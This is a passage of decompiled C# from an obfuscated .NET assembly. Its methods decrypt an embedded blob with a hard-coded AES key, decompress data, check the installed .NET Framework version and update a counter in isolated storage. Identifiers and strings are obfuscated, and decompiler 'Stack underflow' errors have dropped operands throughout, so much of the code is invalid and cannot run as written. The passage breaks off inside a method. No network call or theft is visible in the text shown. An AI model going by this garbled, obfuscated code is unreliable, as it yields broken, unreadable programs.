				_0011._0001(ex, (object)stream, (object)val, (object)P_0);
				throw;
			}
		}

		static bool _0001(global::_0008._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0008._0005)/*Error near IL_0007: Stack underflow*/)._0002;
		}

		static void _0001(string[] P_0)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 3
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					if (2u != 0)
					{
						global::_000F._0005._0001();
						if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
						{
							break;
						}
					}
					_0011._0001();
					while ((int)/*Error near IL_0010: Stack underflow*/ != 0)
					{
						if (0 == 0)
						{
							_0011._0001();
							_ = _0015._0092_0002;
							_ = global::_0004._001A;
							global::_0005._001B(Environment.SpecialFolder.ApplicationData);
							global::_000E._0003._0001(107396731);
							/*Error near IL_006c: Stack underflow*/((string)/*Error near IL_006c: Stack underflow*/, (string)/*Error near IL_006c: Stack underflow*/);
							/*Error near IL_0073: Stack underflow*/((string)/*Error near IL_0073: Stack underflow*/);
							if (7 == 0)
							{
								continue;
							}
							if ((int)/*Error near IL_003d: Stack underflow*/ != 0)
							{
								goto IL_003f;
							}
						}
						global::_0007._0001._0001();
						goto IL_003f;
						IL_003f:
						if (false)
						{
						}
						return;
					}
				}
				while (4 == 0);
			}
			catch (Exception ex)
			{
				object[] array = new object[1] { P_0 };
				Exception ex2 = ex;
				object[] array2 = array;
				_0011._0001(array2, ex2);
			}
		}

		unsafe static int _0001(string P_0, Graphics P_1, Font P_2, int P_3)
		{
			//IL_0090: Incompatible stack heights: 0 vs 4
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 2
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c6: Incompatible stack heights: 0 vs 2
			//IL_00d0: Incompatible stack heights: 0 vs 1
			global::_0006._0004._0001 obj = default(global::_0006._0004._0001);
			int num = default(int);
			IntPtr intPtr = default(IntPtr);
			while (true)
			{
				_ = ref obj;
				_ = 0;
				_ = 0;
				new Rectangle((int)/*Error near IL_009a: Stack underflow*/, (int)/*Error near IL_009a: Stack underflow*/, (int)/*Error near IL_009a: Stack underflow*/, 10000);
				*(global::_0006._0004._0001*)/*Error near IL_00a4: Stack underflow*/ = new global::_0006._0004._0001((Rectangle)/*Error near IL_00a4: Stack underflow*/);
				while (true)
				{
					if (4 == 0)
					{
						goto IL_003e;
					}
					if (0 == 0)
					{
						num = 3088;
						goto IL_0028;
					}
					goto IL_0075;
					IL_0028:
					_ = _008A_0003._007E_001F_0006;
					/*Error near IL_00ba: Stack underflow*/((object)/*Error near IL_00ba: Stack underflow*/);
					if (0 == 0)
					{
						intPtr = (IntPtr)/*Error near IL_00c0: Stack underflow*/;
					}
					goto IL_003e;
					IL_0075:
					_008B_0003._007E_0080_0006(P_1, intPtr);
					return obj._0004 - obj._0002;
					IL_003e:
					_ = _008A_0003._007E_007F_0006;
					/*Error near IL_00d0: Stack underflow*/((object)/*Error near IL_00d0: Stack underflow*/);
					IntPtr intPtr2 = (IntPtr)/*Error near IL_004e: Stack underflow*/;
					IntPtr intPtr3 = _0011._0001(intPtr, intPtr2);
					if (false)
					{
						goto IL_0028;
					}
					if (5 == 0)
					{
						break;
					}
					_0011._0001(intPtr, P_0, -1, ref obj, num);
					if (false)
					{
						continue;
					}
					_0011._0001(intPtr, intPtr3);
					goto IL_0075;
				}
			}
		}

		static void _0001(byte[] P_0, short[] P_1, global::_0008._0004._0007._0001 P_2)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				while (true)
				{
					if (8u != 0 && 5u != 0)
					{
						((global::_0008._0004._0007._0001)/*Error near IL_000f: Stack underflow*/)._0002 = (short[])/*Error near IL_000f: Stack underflow*/;
						goto IL_000f;
					}
					goto IL_001b;
					IL_001b:
					if (2u != 0)
					{
						break;
					}
					goto IL_000f;
					IL_000f:
					if (false)
					{
						continue;
					}
					((global::_0008._0004._0007._0001)/*Error near IL_001b: Stack underflow*/)._0001 = (byte[])/*Error near IL_001b: Stack underflow*/;
					goto IL_001b;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_2, (object)P_1, (object)P_0);
				throw;
			}
		}

		unsafe static int _0001(global::_0008._0004._0002 P_0, byte[] P_1, int P_2, int P_3)
		{
			//IL_011d: Incompatible stack heights: 0 vs 1
			//IL_0123: Incompatible stack heights: 0 vs 1
			//IL_012a: Incompatible stack heights: 0 vs 1
			//IL_0130: Incompatible stack heights: 0 vs 1
			//IL_0136: Incompatible stack heights: 0 vs 1
			//IL_013c: Incompatible stack heights: 0 vs 1
			//IL_0142: Incompatible stack heights: 0 vs 1
			//IL_0148: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			try
			{
				*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
				do
				{
					IL_006a:
					if (P_0._0003 > 0 && P_3 > 0)
					{
						P_2++;
						uint num = ((global::_0008._0004._0002)/*Error near IL_002b: Stack underflow*/)._0001;
						((sbyte[])/*Error near IL_002d: Stack underflow*/)[/*Error near IL_002d: Stack underflow*/] = (sbyte)(byte)num;
						uint num2 = ((global::_0008._0004._0002)/*Error near IL_003c: Stack underflow*/)._0001;
						((global::_0008._0004._0002)/*Error near IL_0043: Stack underflow*/)._0001 = num2 >> 8;
						int num3 = ((global::_0008._0004._0002)/*Error near IL_0052: Stack underflow*/)._0003;
						((global::_0008._0004._0002)/*Error near IL_0059: Stack underflow*/)._0003 = num3 - 8;
						P_3--;
						if (8u != 0)
						{
							(*(int*)ptr)++;
							goto IL_006a;
						}
					}
					else
					{
						if (P_3 == 0)
						{
							*(int*)((byte*)ptr + 12) = *(int*)ptr;
							break;
						}
						*(int*)((byte*)ptr + 4) = P_0._0002 - P_0._0001;
						if (P_3 > *(int*)((byte*)ptr + 4))
						{
							P_3 = *(int*)((byte*)ptr + 4);
						}
						Array.Copy(P_0._0001, P_0._0001, P_1, P_2, P_3);
						P_0._0001 += P_3;
						if (((P_0._0001 - P_0._0002) & 1) == 0)
						{
							goto IL_010b;
						}
						byte[] array = P_0._0001;
						*(int*)((byte*)ptr + 8) = P_0._0001;
						P_0._0001 = *(int*)((byte*)ptr + 8) + 1;
						P_0._0001 = array[*(int*)((byte*)ptr + 8)] & 0xFFu;
					}
					P_0._0003 = 8;
					goto IL_010b;
					IL_010b:
					*(int*)((byte*)ptr + 12) = *(int*)ptr + P_3;
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)P_0, (object)P_1, (object)P_2, (object)P_3);
				throw;
			}
			return *(int*)((byte*)ptr + 12);
		}

		static string _0001()
		{
			//IL_016a: Incompatible stack heights: 0 vs 1
			//IL_0174: Incompatible stack heights: 0 vs 1
			//IL_0180: Incompatible stack heights: 0 vs 1
			//IL_018a: Incompatible stack heights: 0 vs 1
			//IL_01a8: Incompatible stack heights: 0 vs 4
			//IL_01b2: Incompatible stack heights: 0 vs 4
			global::_0008._0002 obj = default(global::_0008._0002);
			global::_0002._0003 obj3 = default(global::_0002._0003);
			string text = default(string);
			int? num = default(int?);
			int valueOrDefault = default(int);
			try
			{
				_ = global::_0010._0003._0003;
				_ = 0;
				_ = 131097;
				global::_000E._0003._0001(107391619);
				global::_0002._0003 obj2 = _0011._0001((UIntPtr)/*Error near IL_001c: Stack underflow*/, (global::_0008._0003)/*Error near IL_001c: Stack underflow*/, (global::_0001._0005)/*Error near IL_001c: Stack underflow*/, (string)/*Error near IL_001c: Stack underflow*/, out obj);
				if (obj2 == null)
				{
					_ = global::_0010._0003._0003;
					_ = 0;
					_ = 131097;
					global::_000E._0003._0001(107391582);
					obj2 = _0011._0001((UIntPtr)/*Error near IL_01bc: Stack underflow*/, (global::_0008._0003)/*Error near IL_01bc: Stack underflow*/, (global::_0001._0005)/*Error near IL_01bc: Stack underflow*/, (string)/*Error near IL_01bc: Stack underflow*/, out obj);
				}
				obj3 = obj2;
				try
				{
					if ((int)/*Error near IL_0048: Stack underflow*/ != 0)
					{
						global::_000E._0003._0001(107391977);
						text = (string)/*Error near IL_017a: Stack underflow*/;
						return text;
					}
					global::_000E._0003._0001(107391972);
					num = ((global::_0002._0003)/*Error near IL_0070: Stack underflow*/)._0001((string)/*Error near IL_0070: Stack underflow*/) as int?;
					if (4u != 0)
					{
						valueOrDefault = num.GetValueOrDefault();
						int num2 = valueOrDefault;
						if (5u != 0)
						{
							if (num2 >= 461808)
							{
								goto IL_0092;
							}
							if (valueOrDefault < 461308)
							{
								if (valueOrDefault >= 460798)
								{
									text = global::_000E._0003._0001(107391961);
									return text;
								}
								int num3 = valueOrDefault;
								if (0 == 0)
								{
									if (num3 >= 394802)
									{
										text = global::_000E._0003._0001(107391956);
										return text;
									}
									if (valueOrDefault >= 394254)
									{
										text = global::_000E._0003._0001(107391915);
										return text;
									}
									if (valueOrDefault < 393295)
									{
										if (valueOrDefault >= 379893)
										{
											text = global::_000E._0003._0001(107391933);
											return text;
										}
										if (valueOrDefault >= 378675)
										{
											text = global::_000E._0003._0001(107391924);
											return text;
										}
										if (valueOrDefault >= 378389)
										{
											text = global::_000E._0003._0001(107391883);
											return text;
										}
										text = global::_000E._0003._0001(107391977);
										return text;
									}
									num3 = 107391906;
								}
								text = global::_000E._0003._0001(num3);
								return text;
							}
							num2 = 107391938;
						}
						text = global::_000E._0003._0001(num2);
						return text;
					}
					goto IL_0092;
					IL_0092:
					text = global::_000E._0003._0001(107391991);
					return text;
				}
				finally
				{
					if (obj3 != null)
					{
						global::_000F._007E_0099(obj3);
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj3, (object)obj, (object)valueOrDefault, (object)text, (object)num);
				throw;
			}
		}

		static void _0001(byte[] P_0, int P_1, global::_0008._0004._0002 P_2, int P_3)
		{
			//IL_0017: Invalid comparison between Unknown and I4
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0045: Incompatible stack heights: 1 vs 0
			//IL_0047: Invalid comparison between Unknown and I4
			//IL_004e: Incompatible stack heights: 0 vs 2
			//IL_0050: Invalid comparison between Unknown and I4
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 2
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Expected I4, but got Unknown
			//IL_00d9: Incompatible stack heights: 0 vs 2
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00e5: Incompatible stack heights: 0 vs 1
			int num3 = default(int);
			try
			{
				int num;
				if (8u != 0)
				{
					_ = ((global::_0008._0004._0002)/*Error near IL_000d: Stack underflow*/)._0001;
					num = ((global::_0008._0004._0002)/*Error near IL_0017: Stack underflow*/)._0002;
					goto IL_0017;
				}
				goto IL_0058;
				IL_0052:
				throw new ArgumentOutOfRangeException();
				IL_0058:
				int num2 = P_1 & 1;
				goto IL_005b;
				IL_005b:
				if (num2 != 0)
				{
					if (false)
					{
						goto IL_0052;
					}
					P_2._0001 |= (uint)((P_0[P_3++] & 0xFF) << P_2._0003);
					P_2._0003 += 8;
				}
				P_2._0001 = P_0;
				P_2._0001 = P_3;
				if (8u != 0)
				{
					P_2._0002 = num3;
					return;
				}
				goto IL_0032;
				IL_004f:
				int num4 = (int)/*Error near IL_0050: Stack underflow*/;
				if ((int)/*Error near IL_0052: Stack underflow*/ > num4)
				{
					goto IL_0052;
				}
				goto IL_0058;
				IL_0017:
				if ((int)/*Error near IL_0019: Stack underflow*/ < num)
				{
					new InvalidOperationException();
					throw /*Error near IL_001f: Stack underflow*/;
				}
				if (8u != 0)
				{
					num3 = /*Error near IL_002d: Stack underflow*/+ /*Error near IL_002d: Stack underflow*/;
					goto IL_0032;
				}
				goto IL_004f;
				IL_0032:
				_ = 0;
				if (/*Error near IL_003a: Stack underflow*/ <= /*Error near IL_003a: Stack underflow*/)
				{
					if (1 == 0)
					{
						goto IL_0017;
					}
					if ((int)/*Error near IL_0049: Stack underflow*/ <= num)
					{
						num2 = num3;
						if (6u != 0)
						{
							_ = P_0.LongLength;
							goto IL_004f;
						}
						goto IL_005b;
					}
				}
				goto IL_0052;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num3, (object)P_2, (object)P_0, (object)P_3, (object)P_1);
				throw;
			}
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 4
			//IL_002b: Incompatible stack heights: 0 vs 3
			//IL_002e: Incompatible stack heights: 0 vs 3
			//IL_0032: Incompatible stack heights: 0 vs 3
			//IL_0036: Incompatible stack heights: 0 vs 3
			_ = new object[5];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			/*Error near IL_0012: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
			/*Error near IL_0017: Stack underflow*/;
			_ = 3;
			((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = (object)/*Error near IL_001c: Stack underflow*/;
			/*Error near IL_001c: Stack underflow*/;
			_ = 4;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = (object)/*Error near IL_0021: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_003d: Stack underflow*/, (object[])/*Error near IL_003d: Stack underflow*/);
		}

		unsafe static byte[] _0001(byte[] P_0)
		{
			//IL_003e: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0045: Invalid comparison between Unknown and I4
			//IL_016f: Incompatible stack heights: 0 vs 1
			//IL_0179: Incompatible stack heights: 0 vs 1
			//IL_018b: Incompatible stack heights: 0 vs 1
			//IL_0191: Incompatible stack heights: 0 vs 1
			//IL_0197: Incompatible stack heights: 0 vs 1
			//IL_019d: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			global::_0008._0004._000F obj = default(global::_0008._0004._000F);
			byte[] array = default(byte[]);
			int num3 = default(int);
			global::_0010._0004 obj2 = default(global::_0010._0004);
			byte[] array4 = default(byte[]);
			byte[] array2 = default(byte[]);
			byte[] array3 = default(byte[]);
			ICryptoTransform cryptoTransform = default(ICryptoTransform);
			try
			{
				new global::_0008._0004._000F((byte[])/*Error near IL_0179: Stack underflow*/);
				obj = (global::_0008._0004._000F)/*Error near IL_017f: Stack underflow*/;
				array = new byte[0];
				int num = _0011._0001((global::_0008._0004._000F)/*Error near IL_002e: Stack underflow*/);
				int num2 = num >> 24;
				while (true)
				{
					num3 = num2;
					_003F val = /*Error near IL_003f: Stack underflow*/<< 24;
					if (/*Error near IL_0040: Stack underflow*/ - val == 8223355)
					{
						obj2 = (global::_0010._0004)/*Error near IL_0051: Stack underflow*/;
						switch (obj2)
						{
						case global::_0010._0004._0002:
							*(int*)ptr = _0011._0001(obj);
							array = new byte[*(int*)ptr];
							*(int*)((byte*)ptr + 4) = 0;
							while (true)
							{
								num = *(int*)((byte*)ptr + 4);
								num2 = *(int*)ptr;
								if (8 == 0)
								{
									break;
								}
								if (num < num2)
								{
									*(int*)((byte*)ptr + 8) = _0011._0001(obj);
									*(int*)((byte*)ptr + 12) = _0011._0001(obj);
									array4 = new byte[*(int*)((byte*)ptr + 8)];
									obj.Read(array4, 0, array4.Length);
									_0011._0001(array, *(int*)((byte*)ptr + 4), new global::_0008._0004._0001(array4), *(int*)((byte*)ptr + 12));
									*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 12);
									continue;
								}
								goto end_IL_0053;
							}
							continue;
						case global::_0010._0004._0004:
							array2 = new byte[16]
							{
								219, 40, 175, 42, 132, 12, 253, 175, 27, 59,
								107, 153, 222, 208, 195, 38
							};
							array3 = new byte[16]
							{
								208, 196, 38, 143, 182, 247, 2, 0, 34, 150,
								236, 64, 243, 9, 152, 141
							};
							cryptoTransform = _0011._0001(array3, true, array2);
							try
							{
								array = _0011._0001(cryptoTransform.TransformFinalBlock(P_0, 4, P_0.Length - 4));
							}
							finally
							{
								cryptoTransform?.Dispose();
							}
							break;
						default:
							{
								throw new ArgumentOutOfRangeException("version", num3, "Selected compression algorithm is not supported.");
							}
							end_IL_0053:
							break;
						}
						break;
					}
					throw new FormatException("Unknown Header");
				}
				obj.Close();
				obj = null;
				return array;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, new object[13]
				{
					obj,
					array,
					num3,
					obj2,
					*(int*)ptr,
					*(int*)((byte*)ptr + 4),
					*(int*)((byte*)ptr + 8),
					*(int*)((byte*)ptr + 12),
					array4,
					array2,
					array3,
					cryptoTransform,
					P_0
				});
				throw;
			}
		}

		static ICryptoTransform _0001(byte[] P_0, bool P_1, byte[] P_2)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			RijndaelManaged rijndaelManaged = default(RijndaelManaged);
			ICryptoTransform cryptoTransform = default(ICryptoTransform);
			try
			{
				new RijndaelManaged();
				rijndaelManaged = (RijndaelManaged)/*Error near IL_005d: Stack underflow*/;
				try
				{
					if (4u != 0 && (int)/*Error near IL_000e: Stack underflow*/ == 0)
					{
						goto IL_0034;
					}
					((SymmetricAlgorithm)/*Error near IL_0022: Stack underflow*/).CreateDecryptor((byte[])/*Error near IL_0022: Stack underflow*/, P_0);
					goto IL_0022;
					IL_0034:
					((SymmetricAlgorithm)/*Error near IL_0039: Stack underflow*/).CreateEncryptor((byte[])/*Error near IL_0039: Stack underflow*/, (byte[]?)/*Error near IL_0039: Stack underflow*/);
					goto IL_0022;
					IL_0022:
					cryptoTransform = (ICryptoTransform)/*Error near IL_0023: Stack underflow*/;
					if (false)
					{
						goto IL_0034;
					}
				}
				finally
				{
					do
					{
						((IDisposable)rijndaelManaged)?.Dispose();
					}
					while (false);
				}
				return cryptoTransform;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)rijndaelManaged, (object)cryptoTransform, (object)P_2, (object)P_0, (object)P_1);
				throw;
			}
		}

		static string _0001(global::_0004._0001 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				string text = ((global::_0004._0001)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (string)/*Error near IL_001c: Stack underflow*/;
		}

		unsafe static int _0001(global::_0008._0004._0008 P_0)
		{
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Expected I4, but got Unknown
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 2
			//IL_008a: Incompatible stack heights: 0 vs 2
			//IL_008d: Incompatible stack heights: 0 vs 1
			//IL_0090: Incompatible stack heights: 0 vs 2
			//IL_0093: Incompatible stack heights: 0 vs 2
			//IL_0096: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[8];
			short num4 = default(short);
			try
			{
				_ = ((global::_0008._0004._0008)/*Error near IL_0015: Stack underflow*/)._0001 << 5;
				_ = ((global::_0008._0004._0008)/*Error near IL_001e: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0008)/*Error near IL_0025: Stack underflow*/)._0005;
				byte num2 = ((byte[])/*Error near IL_0028: Stack underflow*/)[num + 2];
				_003F val = /*Error near IL_0029: Stack underflow*/^ num2;
				*(int*)(nint)/*Error near IL_0030: Stack underflow*/ = val & 0x7FFF;
				_ = ((global::_0008._0004._0008)/*Error near IL_0037: Stack underflow*/)._0002;
				_ = ((global::_0008._0004._0008)/*Error near IL_003e: Stack underflow*/)._0005 & 0x7FFF;
				_ = ((global::_0008._0004._0008)/*Error near IL_004b: Stack underflow*/)._0001;
				int num3 = *(int*)(nint)/*Error near IL_004e: Stack underflow*/;
				short num5 = (num4 = ((short[])/*Error near IL_004f: Stack underflow*/)[num3]);
				((short[])/*Error near IL_0052: Stack underflow*/)[/*Error near IL_0052: Stack underflow*/] = num5;
				P_0._0001[*(int*)ptr] = (short)P_0._0005;
				P_0._0001 = *(int*)ptr;
				*(int*)((byte*)ptr + 4) = num4 & 0xFFFF;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num4, (object)(*(int*)ptr), (object)P_0);
				throw;
			}
			return *(int*)((byte*)ptr + 4);
		}

		static void _0001(long P_0, string P_1)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0064: Incompatible stack heights: 0 vs 2
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006e: Expected I8, but got Unknown
			//IL_0071: Incompatible stack heights: 0 vs 2
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_008f: Incompatible stack heights: 0 vs 3
			//IL_0099: Incompatible stack heights: 0 vs 1
			IsolatedStorageFileStream isolatedStorageFileStream = default(IsolatedStorageFileStream);
			ulong num = default(ulong);
			try
			{
				_ = 3;
				_ = 4;
				_0011._0001((FileAccess)/*Error near IL_0099: Stack underflow*/, (FileMode)/*Error near IL_0099: Stack underflow*/, (string)/*Error near IL_0099: Stack underflow*/);
				isolatedStorageFileStream = (IsolatedStorageFileStream)/*Error near IL_009f: Stack underflow*/;
				try
				{
					_ = _0014_0003._007E_0004_0006;
					_003F val = /*Error near IL_001d: Stack underflow*/+ 8;
					if (4u != 0)
					{
						/*Error near IL_006e: Stack underflow*/((object)/*Error near IL_006e: Stack underflow*/, (long)val);
					}
					_ = _0014_0003._007E_0004_0006;
					/*Error near IL_007b: Stack underflow*/((object)/*Error near IL_007b: Stack underflow*/, (long)/*Error near IL_007b: Stack underflow*/);
					num = _008C_0003._007E_0081_0006(new BinaryReader(isolatedStorageFileStream));
					num++;
					_0014_0003._007E_0004_0006(isolatedStorageFileStream, P_0);
					_008D_0003._007E_0082_0006(new BinaryWriter(isolatedStorageFileStream), num);
				}
				finally
				{
					if (isolatedStorageFileStream != null)
					{
						global::_000F._007E_0099(isolatedStorageFileStream);
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)isolatedStorageFileStream, (object)num, (object)P_1, (object)P_0);
				throw;
			}
		}

		static Version _0001(Version P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			OsInformation._0096_0003_009E_0006();
			OsInformation._0011_009A_000F_0003((global::_0002._0002)/*Error near IL_0016: Stack underflow*/, (Version)/*Error near IL_0016: Stack underflow*/);
			return (Version)/*Error near IL_0007: Stack underflow*/;
		}

		static void _0001(global::_0008._0004._000E P_0, int P_1, int P_2)
		{
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Expected I4, but got Unknown
			//IL_003c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Expected I4, but got Unknown
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 2
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			//IL_00d9: Incompatible stack heights: 0 vs 1
			//IL_00df: Incompatible stack heights: 0 vs 2
			//IL_00e5: Incompatible stack heights: 0 vs 1
			//IL_00eb: Incompatible stack heights: 0 vs 1
			int num2 = default(int);
			try
			{
				_ = ((global::_0008._0004._000E)/*Error near IL_000f: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._000E)/*Error near IL_001e: Stack underflow*/)._0003;
				_003F val = /*Error near IL_0022: Stack underflow*/<< num;
				_003F val2 = /*Error near IL_0023: Stack underflow*/| val;
				((global::_0008._0004._000E)/*Error near IL_0028: Stack underflow*/)._0001 = (uint)(int)val2;
				_ = ((global::_0008._0004._000E)/*Error near IL_0037: Stack underflow*/)._0003;
				_003F val3 = /*Error near IL_003d: Stack underflow*/+ /*Error near IL_003d: Stack underflow*/;
				((global::_0008._0004._000E)/*Error near IL_0042: Stack underflow*/)._0003 = (int)val3;
				if (((global::_0008._0004._000E)/*Error near IL_004c: Stack underflow*/)._0003 < 16)
				{
					return;
				}
				do
				{
					if (uint.MaxValue != 0)
					{
						byte[] array = ((global::_0008._0004._000E)/*Error near IL_005d: Stack underflow*/)._0001;
						num2 = P_0._0002++;
						array[num2] = (byte)P_0._0001;
						byte[] array2 = P_0._0001;
						num2 = P_0._0002++;
						array2[num2] = (byte)(P_0._0001 >> 8);
						P_0._0001 >>= 16;
					}
				}
				while (8 == 0);
				P_0._0003 -= 16;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num2, (object)P_0, (object)P_1, (object)P_2);
				throw;
			}
		}

		static void _0001()
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			try
			{
				try
				{
					global::_000E._0003._0001(107391878);
					_0011._0001();
					if ((int)/*Error near IL_000b: Stack underflow*/ == 0)
					{
						global::_000E._0003._0001(107391849);
					}
					else
					{
						global::_000E._0003._0001(107391844);
					}
					_ = (string?)/*Error near IL_0042: Stack underflow*/ + (string?)/*Error near IL_0042: Stack underflow*/;
					global::_0010._0006._0001((string)/*Error near IL_0049: Stack underflow*/);
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
		}

		static string _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_000E._0003._0001(107396893);
			return (string)/*Error near IL_0008: Stack underflow*/;
		}

		static void _0001()
		{
			try
			{
				try
				{
					_0011._0001();
				}
				catch (Exception)
				{
				}
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2);
				throw;
			}
		}

		static bool _0001()
		{
			//IL_0008: Invalid comparison between Unknown and I4
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			try
			{
				_0098_0002._0084_0005();
				bool flag = (int)/*Error near IL_000a: Stack underflow*/ == 8;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (byte)/*Error near IL_0022: Stack underflow*/ != 0;
		}

		unsafe static string _0001()
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_0095: Incompatible stack heights: 0 vs 1
			//IL_00a5: Incompatible stack heights: 0 vs 2
			//IL_00a8: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 2
			byte[] array = default(byte[]);
			uint num = default(uint);
			try
			{
				if (0 == 0)
				{
					array = new byte[8];
				}
				string result;
				if (true)
				{
					_0011._0001(ref array);
					if (0 == 0)
					{
						if ((int)/*Error near IL_001a: Stack underflow*/ != 0)
						{
							if (3u != 0)
							{
								_ = _0015_0002._001D_0004;
								global::_000E._0003._0001(107391866);
								_ = _008E_0003._0083_0006;
								/*Error near IL_00af: Stack underflow*/((byte[])/*Error near IL_00af: Stack underflow*/, 4);
								num = (uint)/*Error near IL_00b2: Stack underflow*/;
								_ = ref num;
								global::_000E._0003._0001(107391857);
								string text = ((uint*)/*Error near IL_0057: Stack underflow*/)->ToString((string?)/*Error near IL_0057: Stack underflow*/);
								num = _008E_0003._0083_0006(array, 0);
								string text2 = num.ToString(global::_000E._0003._0001(107391857));
								result = /*Error near IL_007a: Stack underflow*/((string)/*Error near IL_007a: Stack underflow*/, text, text2);
							}
							if (5 == 0)
							{
								return result;
							}
							return result;
						}
						_ = 107391871;
					}
					global::_000E._0003._0001((int)/*Error near IL_0095: Stack underflow*/);
					return (string)/*Error near IL_009a: Stack underflow*/;
				}
				return result;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)num);
				throw;
			}
		}

		static string _0001(string P_0)
		{
			//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f0: Expected O, but got Unknown
